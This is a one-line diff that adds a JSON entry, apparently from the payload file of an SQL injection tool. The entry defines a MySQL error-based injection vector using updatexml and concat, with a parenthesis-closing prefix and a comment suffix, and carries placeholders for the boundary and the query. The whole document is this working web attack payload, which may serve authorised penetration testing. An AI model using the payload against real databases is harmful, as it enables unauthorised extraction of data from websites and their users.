@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "error", "boundary": {"prefix": ")", "suffix": "-- -", "type": "paren-num"}, "vector": "{B} AND updatexml(1,concat(0x7e,({Q})),1)", "comment": "mysql error: num in paren"}
